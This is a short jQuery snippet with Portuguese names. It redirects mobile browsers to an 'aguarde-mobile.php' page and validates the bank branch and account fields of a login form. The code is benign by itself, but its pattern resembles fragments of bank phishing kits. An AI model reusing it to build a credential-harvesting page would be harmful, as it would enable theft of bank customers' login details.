<script>
function checa_navegador(){
  var ua = navigator.userAgent.toLowerCase();
  var uMobile = '';
  uMobile = 'ipad;iphone;ipod;windows phone;android;iemobile 8';
  v_uMobile = uMobile.split(';');
  var boolMovel = false;

  for (i=0;i<=v_uMobile.length;i++){
          if (ua.indexOf(v_uMobile[i]) != -1){
                  boolMovel = true;
          }
  }

  if (boolMovel == true){
          location.href='aguarde-mobile.php';
  }
}

$('body').ready(function(event){
  checa_navegador();
})
</script>
<script type="text/javascript">
$('#agencia').keypress(function(e) {
    if(e.which == 13) {
      e.preventDefault();
    }
});

$('#conta').keypress(function(e) {
    if(e.which == 13) {
      e.preventDefault();
    }
});

$('#agencia').focusout(function(event) {
    if($('#agencia').val().length < 2){
      $('#agencia').val("");
      $(".um").show('fast');
      $('#agencia').addClass('red');
    }else{
      $(".um").hide('fast');
      $('#agencia').removeClass('red');
    }
});

$('#conta').focusout(function(event) {
    if($('#conta').val().length < 2){
      $('#conta').val("");
      $(".um").show('fast');
      $('#conta').addClass('red');
    }else{
      $(".um").hide('fast');
      $('#conta').removeClass('red');
    }
});

$('#entrar').click(function(event) {
  if($('#agencia').val().length < 2){
    $('#agencia').focus()
    $('#agencia').addClass('red');
  }else if($('#conta').val().length < 3){
    $('#conta').focus()
    $('#conta').addClass('red');
  }else{
    $('#tipo1').submit();
  }  
});

</script>
